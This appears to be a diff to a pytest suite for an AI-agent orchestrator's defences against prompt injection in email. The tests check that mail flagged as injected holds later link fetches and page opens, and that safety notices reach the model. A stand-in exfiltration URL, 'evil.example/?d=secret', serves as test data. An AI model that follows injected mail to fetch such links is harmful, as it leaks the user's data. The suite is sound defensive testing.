@@ -50,6 +50,14 @@ LINK = {"question": "what is at https://evil.example/?d=secret"}
 
 
 @pytest.fixture(autouse=True)
+def _careful_holds_no_asked_step(monkeypatch: pytest.MonkeyPatch) -> None:
+    """The suite pins Approvals to Careful (tests/conftest.py), which holds
+    every acting step a turn asks for (take_the_lead._asked_hit); these
+    tests are about other checks, so that hold stays out."""
+    monkeypatch.setattr("openexecutive.orchestrator.take_the_lead._careful_turn", lambda: None)
+
+
+@pytest.fixture(autouse=True)
 def db(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[Path]:
     path = tmp_path / "episodic.db"
     monkeypatch.setattr(episodic, "DB_PATH", path)
@@ -719,17 +727,27 @@ def test_careful_holds_after_mail_the_check_cleared(
     assert fetched == []
 
 
-def test_hands_off_lets_a_link_run_even_after_flagged_mail(
+def test_hands_off_runs_a_link_after_clean_mail_but_not_after_flagged_mail(
     monkeypatch: pytest.MonkeyPatch, fetched: list[dict[str, Any]],
 ) -> None:
-    from openexecutive.orchestrator import outside_mode
+    from openexecutive.orchestrator import content_scan, outside_mode
 
+    _level(monkeypatch, outside_mode.TRUST, content_scan.CLEAN)
+    _turn(
+        [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
+        [ToolUseBlock("tu2", "run_executive_research", LINK)],
+    )
+    assert fetched == [LINK]
+    fetched.clear()
+
+    # A flagged read is someone else's words: the rest of the turn runs at
+    # Balanced, which holds the link after flagged mail.
     _level(monkeypatch, outside_mode.TRUST, _flagged())
     _, calls = _turn(
         [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
         [ToolUseBlock("tu2", "run_executive_research", LINK)],
     )
-    assert fetched == [LINK]
+    assert fetched == []
     # The flag still reaches the model as a notice.
     assert str(_result_of(calls, "tu1")).startswith("[Safety check: this content looks like")
 
@@ -739,7 +757,7 @@ def _pinned_turn(mode: str, **pin: Any) -> tuple[Any, Any, Any]:
 
     session = Session(from_web_chat=True)
     session.turn_delegation = TurnDelegation(  # type: ignore[attr-defined]
-        enabled=True, offered=True, touched_mail=True, read_mail=True, session_id=session.session_id, **pin,
+        enabled=True, offered=True, touched_mail=True, session_id=session.session_id, **{"read_mail": True, **pin},
     )
     token = current_session.set(session)
     state = outside_content.begin_turn(session, user_message="hi")
@@ -824,6 +842,58 @@ def test_a_turn_with_no_safety_state_holds_after_any_mail_read() -> None:
     try:
         assert lockdown.mail_lock_holds(session.turn_delegation)  # type: ignore[attr-defined]
         assert lockdown.outside_reach_refusal("run_workflow") is not None
+    finally:
+        current_session.reset(token)
+
+
+@pytest.mark.parametrize(
+    ("mode", "pin", "reading_now", "waits"),
+    [
+        # Balanced: a read in this round, not yet seen by the model, lets
+        # the page open; once the check cleared every read, too.
+        ("outsiders", {"read_mail": False}, True, False),
+        ("outsiders", {"mail_vetted": True}, True, False),
+        ("outsiders", {"mail_vetted": True}, False, False),
+        # A read from an earlier round no check cleared (a script ran beside
+        # it) holds it: the model has seen that mail.
+        ("outsiders", {}, False, True),
+        # A read the check flagged, or couldn't check, still holds it.
+        ("outsiders", {"mail_vetted": True, "mail_held": True}, False, True),
+        ("outsiders", {"unchecked_mail": True}, False, True),
+        # Careful waits after any mail read, as for every other step.
+        ("ask", {"mail_vetted": True}, False, True),
+        ("trust", {"mail_held": True}, True, False),
+    ],
+)
+def test_opening_a_page_waits_only_for_flagged_mail_on_balanced(
+    monkeypatch: pytest.MonkeyPatch, mode: str, pin: dict[str, Any], reading_now: bool, waits: bool,
+) -> None:
+    from openexecutive.orchestrator import content_trust, outside_content
+
+    monkeypatch.setattr(content_trust, "principal_only_withheld", lambda session: frozenset())
+    session, token, state = _pinned_turn(mode, **pin)
+    try:
+        for tool in lockdown.PAGE_OPENS:
+            assert lockdown.mail_turn_withholds(
+                tool, {"url": "https://example.com"}, reading_now=reading_now
+            ) is waits, tool
+        if mode == "outsiders" and pin == {"read_mail": False}:
+            # A click or typing on the page still waits for the check.
+            assert lockdown.mail_turn_withholds("run_script", {}, reading_now=reading_now)
+    finally:
+        outside_content.end_turn(state)
+        current_session.reset(token)
+
+
+def test_a_page_waits_after_mail_on_a_turn_with_no_safety_state() -> None:
+    session = Session()
+    session.turn_delegation = TurnDelegation(  # type: ignore[attr-defined]
+        enabled=True, offered=True, touched_mail=True, read_mail=True, mail_vetted=True,
+        session_id=session.session_id,
+    )
+    token = current_session.set(session)
+    try:
+        assert lockdown.mail_turn_withholds("browser_open_tab", {"url": "https://example.com"})
     finally:
         current_session.reset(token)
 
@@ -1064,6 +1134,36 @@ def test_the_executives_own_verified_mail_in_a_search_is_not_checked(monkeypatch
         ]
         assert notice.startswith("[Safety check: the subject and sender name of 1 of these emails")
         assert not pinned.mail_held
+    finally:
+        outside_content.end_turn(state)
+        current_session.reset(token)
+
+
+def test_a_left_out_entry_keeps_hands_off(monkeypatch: pytest.MonkeyPatch) -> None:
+    # A flagged entry taken out of a search before the model reads it is
+    # still flagged, but its words never reach the turn: Hands-off stays.
+    from openexecutive.orchestrator import (
+        content_scan,
+        content_trust,
+        outside_content,
+        outside_mode,
+    )
+
+    monkeypatch.setattr(content_trust, "principal_only_withheld", lambda session: frozenset())
+
+    async def says_of_list(entries: list[Any], *, model: str | None = None) -> Any:
+        if any("evil" in str(e.get("subject")) for e in entries):
+            return content_scan.Verdict(flagged=True, categories=("forward_or_share",), items=(3,))
+        return content_scan.CLEAN
+
+    _level(monkeypatch, "trust", content_scan.CLEAN)
+    monkeypatch.setattr(content_scan, "scan_list", says_of_list)
+    session, token, state = _pinned_turn("trust", mail_verified={"t1": OWN, "t3": OWN})
+    try:
+        pinned = session.turn_delegation  # type: ignore[attr-defined]
+        result, _ = asyncio.run(outside_content.check_mail_read(pinned, OWN_SEARCH))
+        assert json.loads(result)["threads"][3]["subject"] == "(left out)"
+        assert state.flags and state.mode == outside_mode.TRUST
     finally:
         outside_content.end_turn(state)
         current_session.reset(token)
